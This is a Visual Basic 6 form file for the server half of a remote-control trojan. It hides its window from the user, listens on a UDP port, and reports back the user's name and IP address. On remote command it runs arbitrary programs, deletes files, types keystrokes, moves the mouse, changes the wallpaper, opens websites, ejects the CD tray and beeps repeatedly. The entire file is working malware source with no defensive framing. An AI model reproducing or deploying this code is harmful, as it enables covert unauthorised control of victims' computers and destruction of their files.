VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmServer 
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   3000
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   6000
   Icon            =   "frmServer.frx":0000
   LinkTopic       =   "Form1"
   Picture         =   "frmServer.frx":030A
   ScaleHeight     =   3000
   ScaleWidth      =   6000
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin MSWinsockLib.Winsock win 
      Left            =   1560
      Top             =   2160
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
      LocalPort       =   2000
   End
End
Attribute VB_Name = "frmServer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function SendMessage Lib "User32" Alias "SendMessageA" ( _
    ByVal hWnd As Long, _
    ByVal wMsg As Long, _
    ByVal wParam As Long, _
    ByVal lParam As Long) As Long
    Private Const WM_SYSCOMMAND = &H112&
    Private Const SC_SCREENSAVE = &HF140&
Private Declare Function ShellExecute Lib "shell32.dll" Alias _
    "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As _
    String, ByVal lpFile As String, ByVal lpParameters As String, _
    ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
'This form should not be visible to the person who has it running on their computer.
'It will simply do all the actions without actualy being visible.


Private Sub Form_Load()
With win
    .Protocol = sckUDPProtocol
    .LocalPort = 100
    .Bind
End With
Dim DirNew As String
Dim rc As Long
On Error Resume Next
MkDir "c:\testdummy"
End Sub

Private Sub win_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim data As String
win.GetData data

m = sGetUserName()
If data = "Connect" Then
With win
.SendData "log Welcome to " & m & "    [" & win.LocalIP & "]"
.SendData "log " & Chr(10)
.SendData "log Thank you for hacking my computer."
.SendData "log " & Chr(10) & Chr(10)
End With
End If
Select Case Left(data, 3)
Case "ope"
b = Right(data, Len(data) - 4)
Shell b, vbNormalFocus
win.SendData "log " & b & " has been succesfully opened, unless otherwise stated!" & Chr(10)
Case "fil"
frmFill.Show
Case "crs"
ms = Right(data, Len(data) - 4)
b = Left(ms, 4)
s = Right(ms, 4)
SetCursorPos b, s
Case "rcr"
ms = Right(data, Len(data) - 4)
b = Left(ms, 4)
s = Right(ms, 4)
SetCursorPos b, s
win.SendData "log Mouse Sent to: " & b & ", " & s & Chr(10)
Case "scr"
ms = Right(data, Len(data) - 4)
b = Left(ms, 4)
s = Right(ms, 4)
SetCursorPos b, s
win.SendData "log Mouse Sent to: " & b & ", " & s & Chr(10)
Case "www"
RandomSite
Case "olr"
b = Right(data, Len(data) - 4)
Shell "\\" & win.RemoteHostIP & "\" & b, vbNormalFocus
win.SendData "log " & b & " has been successfully opened" & Chr(10)
Case "cwp"
b = Right(data, Len(data) - 4)
t = SystemParametersInfo(20, 0, b, 1)
win.SendData "log The background has been changed to " & b & Chr(10)
Case "sss"
'enjoy!
Dim tmp As Long
tmp = SendMessage(Me.hWnd, WM_SYSCOMMAND, SC_SCREENSAVE, 0&)
win.SendData "log The Screensave has been successfully started" & Chr(10)
Case "del"
b = Right(data, Len(data) - 4)
Kill b
win.SendData "log " & b & " has been successfully deleted" & Chr(10)
Case "snk"
b = Right(data, Len(data) - 4)
SendKeys b, 1
win.SendData "log Typed in the letter " & b
Case "web"
b = Right(data, Len(data) - 4)
ret& = ShellExecute(Me.hWnd, "Open", f, "", App.Path, 1)
win.SendData "log Website " & b & " has been successfully opened" & Chr(10)
Case "pan"
For x = 1 To 20000
Beep
Next
Case "ocd"
SendMCIString "set cd door open", True
Case "ccd"
SendMCIString "set cd door closed", True
End Select
If Err Then win.SendData "log " & Err.Number & ":" & Chr(10) & Err.Description & Chr(10) & Chr(10)
End Sub

Sub RandomSite()
Dim f As String
Dim s As String
Dim y As Integer
y = Int(Rnd * 50)  'Pick a random length for the web address
'enter a loop
For I = 1 To y
m = Int(Rnd * 28)
'Pick which letter is going to be used
Select Case m
Case 1
'set variable = a letter
s = "a"
Case 2
s = "b"
Case 3
s = "c"
Case 4
s = "d"
Case 5
s = "e"
Case 6
s = "f"
Case 7
s = "g"
Case 8
s = "h"
Case 9
s = "i"
Case 10
s = "j"
Case 11
s = "k"
Case 12
s = "l"
Case 13
s = "m"
Case 14
s = "n"
Case 15
s = "o"
Case 16
s = "p"
Case 17
s = "q"
Case 18
s = "r"
Case 19
s = "s"
Case 20
s = "t"
Case 21
s = "u"
Case 22
s = "y"
Case 23
s = "v"
Case 24
s = "w"
Case 25
s = "x"
Case 26
s = "y"
Case 27
s = "z"
End Select
f = f & s
Next
f = "www." & f & ".com"
Dim ret&
      ret& = ShellExecute(Me.hWnd, "Open", f, "", App.Path, 1)
win.SendData "log Website " & f & " has been opened randomly" & Chr(10)
End Sub
Private Function SendMCIString(cmd As String, fShowError As Boolean) As Boolean
Static rc As Long
Static errStr As String * 200

rc = mciSendString(cmd, 0, 0, hWnd)
If (fShowError And rc <> 0) Then
    mciGetErrorString rc, errStr, Len(errStr)
    MsgBox errStr
End If
SendMCIString = (rc = 0)
End Function
